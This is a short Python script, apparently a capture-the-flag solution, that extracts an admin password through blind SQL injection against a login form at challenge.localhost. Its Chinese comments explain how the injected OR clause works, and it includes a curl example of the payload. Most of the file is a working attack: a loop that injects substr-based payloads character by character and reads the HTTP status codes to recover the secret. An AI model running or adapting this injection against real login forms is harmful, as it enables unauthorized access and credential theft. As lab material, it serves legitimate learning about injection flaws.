#!/usr/bin/env python3
import argparse
import string
import sys

import requests

# curl -L -c /tmp/cookie.txt -b /tmp/cookie.txt "http://challenge.localhost:80/" -d "username=admin" -d "password=' or substr(password,1,1)='p' --"
# 在标准 SQL 语法中，AND 的优先级高于 OR。这就相当于：
# (username = 'admin' AND password = '') OR (substr(password, 1, 1) = 'p')
#
# OK -> Hello, admin
# FAIL -> 500 Internal Server Error

cookies = {}
charset = string.printable.strip()
success_indicator = "Hello, admin"
url = "http://challenge.localhost:80/"
fail_indicator = "Invalid"


def blind_sql(
    url, cookies=None, success_indicator="OK", error_indicator=None, timeout=5
):
    result = ""  # Empty string to store the extracted values

    for count in range(1, 60):
        for char in charset:
            payload = (
                f"' OR username='admin' AND substr(password,{count},1)='{char}' --"
            )
            data = {"username": "admin", "password": f"{payload}"}
            try:
                response = requests.post(
                    url, data=data, cookies=cookies, timeout=timeout
                )
                if response.status_code != 403 and response.status_code != 500:
                    result += char
                    print(f" [+] Current extracted: {result}")
                    break
            except requests.RequestException as e:
                print(f" [!] Request error: {e}")
                exit(1)
    return result


if __name__ == "__main__":
    result = blind_sql(url=url, cookies=cookies, success_indicator=success_indicator)
    print(f" [+] Extracted: {result}")
